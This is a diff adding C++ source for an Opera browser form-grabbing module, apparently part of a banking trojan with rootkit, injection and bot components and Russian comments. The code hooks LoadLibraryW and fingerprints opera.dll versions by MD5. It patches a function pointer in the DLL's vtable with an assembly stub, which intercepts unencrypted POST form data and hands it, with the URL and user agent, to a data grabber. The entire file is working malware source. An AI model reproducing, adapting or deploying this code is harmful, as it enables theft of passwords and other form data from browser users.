@@ -1,0 +1,391 @@
+#include <windows.h>
+#include <windowsx.h>
+
+#include "GetApi.h"
+#include "Utils.h"
+#include "Memory.h"
+#include "Strings.h"
+#include "BotConfig.h"
+#include "BotUtils.h"
+#include "Rootkit.h"
+#include "Inject.h"
+#include "Unhook.h"
+#include "Splice.h"
+#include "Loader.h"
+#include "md5.h"
+
+#include "Opera.h"
+
+//#include "BotDebug.h"
+
+
+
+
+template <class STR>
+inline void O_DBGOutMessage(STR Str)
+{
+	#ifdef DebugUtils
+		Debug::MessageEx("Opera", 0, NULL, NULL, (PCHAR)Str);
+	#endif
+}
+
+template <class STR, class ARG1>
+inline void O_DBGOutMessage(STR Str, ARG1 Arg1)
+{
+	#ifdef DebugUtils
+		Debug::MessageEx("Opera", 0, NULL, NULL, (PCHAR)Str, Arg1);
+	#endif
+}
+
+
+#define ODBG   O_DBGOutMessage<>
+
+// Число поддерживаемых версий Opera
+static const LONG OperaVerCount = 4;
+
+
+// Базовые адреса загрузки opera.dll для разных версий браузера
+// используется, чтоб вбивать те же адреса, что и в IDA,
+// не высчитывая каждый раз смещение
+#define Opr_11_00_ImgBase		0x67440000
+#define Opr_11_01_ImgBase		0x67440000
+#define Opr_11_10_ImgBase		0x673C0000
+#define Opr_11_11_ImgBase		0x673C0000
+
+
+// MD5-хеши opera.dll для различных версий Оперы:
+static BYTE OperaMD5Hashes [OperaVerCount][16] = {
+			  0xba, 0xc2, 0x26, 0x29, 0x9e, 0x10, 0x0d, 0x8e,
+			  0x47, 0x09, 0xd1, 0xfc, 0xad, 0xe8, 0x96, 0xb9,		// 11.00
+			  0x95, 0xce, 0x52, 0x17, 0xd7, 0x39, 0x99, 0x95,
+			  0x25, 0xd9, 0x60, 0x30, 0x92, 0x1d, 0xaa, 0xf7,	  // 11.01
+			  0x37, 0xD8, 0x0A, 0x46, 0x16, 0xB6, 0xBA, 0xAB,
+			  0x2A, 0xF4, 0x6C, 0x87, 0x92, 0x8D, 0xB2, 0x49,		// 11.10
+			  0x9C, 0xFB, 0xF6, 0xAC, 0x6D, 0x93, 0xD9, 0x0F,
+			  0x07, 0x59, 0x4E, 0xE1, 0x6D, 0x22, 0xE7, 0x38		// 11.11
+       };
+
+// Относительные адреса процедуры для хука в opera.dll
+static DWORD OperaVAOffsets [OperaVerCount] = {
+				0x67E0C604 - Opr_11_00_ImgBase,   // 11.0.1156.0
+				0x67E107C4 - Opr_11_01_ImgBase,	  // 11.1.1190.0
+				0x67DF54AC - Opr_11_10_ImgBase,	  // 11.10.2092.0
+				0x67DF1574 - Opr_11_11_ImgBase	  // 11.11.2109.0
+       };
+
+//  GetHookProcRVA - на основе MD5-хешей определяет версию opera.dll
+//  и возвращает V-адрес нужной функции или 0, в случае неудачи
+static LONG GetHookProcRVA(PCHAR DllName, HMODULE Module);
+
+// Все функции которые мы будем хучить для Opera
+typedef int ( __stdcall *PGetPostProc)(int i1, int iFlag, LPVOID lpMem, int nLen);
+typedef HMODULE (WINAPI *PLoadLibraryWProc)(LPCWSTR DllName);
+
+static PGetPostProc  Real_GetPostProc;
+static PLoadLibraryWProc Real_LoadLibraryW;
+
+
+HMODULE OperaDLLModule = NULL; // Хэндл Opera.dll на который был поставлен хук
+PCHAR OperaUserAgent = NULL;
+PCHAR RequestURL = NULL;
+DWORD OldPostProcAddr = 0;
+
+void InitializeOperaGlobalData()
+{
+	// инициализировать глобальные данные для форм грабера
+	OldPostProcAddr = 0;
+	OperaUserAgent = NULL;
+	RequestURL = NULL;
+}
+
+
+
+/************************************************************************/
+/* Собственная реализация неэскпортируемой ф-и из opera.dll             */
+// в неё приходят ещё не зашифрованные данные GET/POST запросов
+//--------------------------------
+// Параметры:
+// i1 - не известно, скорее всего неявный указатель Self на объект класса
+// iFlag - не известно, но в коде opera.dll всего один раз из нужного
+//         места вызывается с параметром 0x17
+// lpMem - ук-ль на буфер с данными
+// nLen - длина буфера
+//--------------------------------
+
+void __stdcall Hook_GetPostProc(LPVOID lpMem, int nLen)
+{
+	// Проверям, что вызваны из той процедуры, что нас интересует
+
+
+	PCHAR Request = STR::New((PCHAR)lpMem,(DWORD)nLen);
+
+	// Определяем тип запроса
+	PCHAR MethodStr = NULL;
+	PCHAR Path = NULL;
+	PCHAR Protocol = NULL;
+	THTTPMethod Method = hmUnknown;
+
+
+	if (ParseRequestFirstLine(Request, &MethodStr, &Path, &Protocol))
+		Method = GetMethodFromStr(MethodStr);
+
+	// В случае пост запроса определяем адрес запроса
+	if (Method == hmPOST)
+	{
+		if (RequestURL != NULL)
+			STR::Free(RequestURL);
+
+		// Проверяем тип контента
+		PCHAR CT = HTTPParser::GetHeaderValue(Request, ParamContentType);
+		DWORD Hash = CalcHash(CT);
+
+		STR::Free(CT);
+
+		const static DWORD ConentTypeHash = 0x6B3CDFEC; /* application/x-www-form-urlencoded */
+
+		if (Hash == ConentTypeHash) /* url_encoded*/
+		{
+			// Определяем агент оперы
+			if (OperaUserAgent == NULL)
+				OperaUserAgent = HTTPParser::GetHeaderValue(Request, ParamUserAgent);
+
+			// Определяем адрес запроса
+			PCHAR Host = HTTPParser::GetHeaderValue(Request, ParamHost);
+
+
+			RequestURL = STR::New(4, "http://", Host, "/", Path);
+
+			STR::Free(Host);
+
+			ODBG("POST запрос на %s", RequestURL);
+        }
+	}
+
+
+	// Проверяем на необходимость отправки
+	if (Method == hmUnknown && RequestURL != NULL)
+	{
+		// Запись пост данных
+        ODBG("Отправляем POST данные с %s", RequestURL);
+        DataGrabber::AddHTMLFormData(RequestURL, Request, OperaUserAgent, BROWSER_TYPE_O, DATA_TYPE_FORM);
+	}
+
+	STR::Free2(RequestURL);
+
+	STR::Free(Request);
+	STR::Free(MethodStr);
+	STR::Free(Path);
+	STR::Free(Protocol);
+
+}
+
+/************************************************************************/
+bool WINAPI IsOpera()
+{
+	// Функция вернёт истину если она вызвана в процессе
+	// Java.exe или Javaw.exe
+	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
+
+	if ( ModulePath == NULL )
+		return false;
+
+	pGetModuleFileNameW(NULL, ModulePath, MAX_PATH );
+	DWORD dwProcessHash = GetNameHash( ModulePath );
+
+	bool Result = dwProcessHash == 0x7A38EBF3; /* opera.exe */
+
+	MemFree(ModulePath);
+
+	return Result;
+}
+/************************************************************************/
+
+HMODULE WINAPI Hook_LoadLibraryW(LPCWSTR DllName)
+{
+	HMODULE Module = Real_LoadLibraryW(DllName);
+
+	if (Module != NULL && OperaDLLModule != Module)
+	{
+		DWORD Hash = CalcHashW((PWCHAR)DllName);
+		if (Hash == 0x2506F543 /*opera.dll*/ ||
+			Hash == 0x5A38A1FA /*Opera.dll*/ )
+		{
+			ODBG("Ставим хуки на Opera.dll");
+            PCHAR DLL = WSTR::ToAnsi((PWCHAR)DllName, 0);
+
+			DWORD HookRVA = GetHookProcRVA(DLL, Module);
+			if (HookRVA)
+			{
+				HookOperaApi(HookRVA);
+			}
+			else
+				ODBG("Ошибка получения адреса функции Opera.dll");
+
+            STR::Free(DLL);
+
+//			if (HookOperaApi())
+//				OperaDLLModule = Module;
+		}
+	}
+
+    return Module;
+}
+
+/************************************************************************/
+
+bool HookOperaExe()
+{
+	static const DWORD HashLoadLibraryW = 0xC8AC8030;
+	// Хукаем процедуры загрузки файлов
+	if ( HookApi(DLL_KERNEL32, HashLoadLibraryW, &Hook_LoadLibraryW) )
+	{
+		__asm mov [Real_LoadLibraryW], eax
+	}
+	else
+		return false;
+	
+	OperaDLLModule = NULL;
+
+
+	ODBG("Opera.exe обработан");
+
+	return true;
+}
+
+bool HookOpera()
+{
+	// функция вешает хуки на базовые функции Opera
+
+	// Хуки цепляем в два этапа
+	//	1. Хукаем ыункцию loadLibrary
+	//  2. Отлавливаем загрузку Opera.dll и хукаем её функции.
+	//     Если самим грузить Opera.dll то при закрытии браузера происходит
+	//	   фатальный сбой приводящий к циклическому перезапуску браузера
+
+	if ( !IsOpera() )
+		return false;
+	ODBG("Опера обнаружена");
+
+
+//	DWORD HookVA = GetHookProcVA();
+
+//	if (HookVA)
+//		UnhookOpera(HookVA);
+
+	return HookOperaExe();
+}
+
+/************************************************************************/
+
+/************************************************************************/
+// Патчит DWORD по заданному адресу в VTBL opera.dll
+// возвращает предыдущее значение ячейки
+DWORD PatchOperaVTBL(DWORD dwAddress, DWORD dwValue)
+{
+	// Дефолтное значение
+	DWORD dwRes = 0;
+
+	// Проверка на неверный ук-ль
+	if (!dwAddress)	return 0;
+
+	// Указатель на адрес указателя в VTBL и на адрес, который адресует указатель
+	DWORD *xAddress, *yAddress = NULL;
+
+	// Вычисляем адрес указателя в VTBL
+	xAddress = &dwAddress;
+
+	// Получаем и запоминаем адрес оригинальной ф-и PostProc
+	yAddress = (DWORD *)*xAddress;
+	dwRes = (DWORD)*yAddress;
+
+	// Патчим адрес в VTBL на нашу ф-ю
+	DWORD dwOldProtect = 0;
+	if (pVirtualProtect(yAddress, sizeof(DWORD), PAGE_READWRITE, &dwOldProtect))
+	{
+		// Патчим значение по адресу
+		*yAddress = dwValue;
+
+		// Возвращаем на место атрибуты ячейки с адресом
+		pVirtualProtect(yAddress, sizeof(DWORD), dwOldProtect, &dwOldProtect);
+	}
+
+	return dwRes;
+}
+
+
+/************************************************************************/
+// Ассемблерная вставка для безопасного перехвата оригинальной
+// PostProc, сохраняем все регистры общего назначения, т.к.
+// в разных версиях Opera при передаче параметров в эту ф-ю
+// используется не только стек, но и регистры edi, ecx и др.
+__declspec(naked) void CallHookPostProc()
+{
+	__asm
+	{
+		pushad
+			push	[esp+8+32] // nLen
+			push	[esp+8+32] // lpMem
+			call	Hook_GetPostProc
+		popad
+		jmp		OldPostProcAddr
+	}
+}
+
+
+
+bool HookOperaApi(DWORD HookRVA)
+{
+	ODBG("Обрабаьываем функции Opera.dll");
+    InitializeOperaGlobalData();
+
+
+	OldPostProcAddr = PatchOperaVTBL(HookRVA, (DWORD)&CallHookPostProc);
+	if (!OldPostProcAddr)
+	{
+		return false;
+	}
+
+	
+//	DWORD HookVA = GetHookProcVA();
+//
+//	if (HookVA)
+//	{
+//
+//
+//
+//        InitializeOperaGlobalData();
+//
+//		if ( HookApi2(DLL_OPERA, HookVA, (DWORD)&Hook_GetPostProc ) )
+//		{
+//			__asm mov [Real_GetPostProc], eax
+//		}
+//	}
+	ODBG("Opera.dll обработан");
+	return true;
+}
+
+/************************************************************************/
+LONG GetHookProcRVA(PCHAR DllName, HMODULE Module)
+{
+	// Вернём 0, если адрес определить не удалось
+	LONG res = 0;
+
+	// Получаем полный путь к загруженной opera.dll и считаем её MD5-хеш
+
+	// Считаем хеш от файла
+	TMD5 MD5;
+	if (MD5FromFileA(DllName, MD5))
+	{
+		for (int i = 0; i < OperaVerCount; i++)
+		{
+			// и сравниваем его с известными значениями
+			if (0 == m_memcmp(MD5.Data, OperaMD5Hashes[i], MD5_HASH_SIZE))
+			{
+				res = (DWORD)Module + OperaVAOffsets[i];
+				break;
+			}
+		}
+	}
+
+	return res;
+}
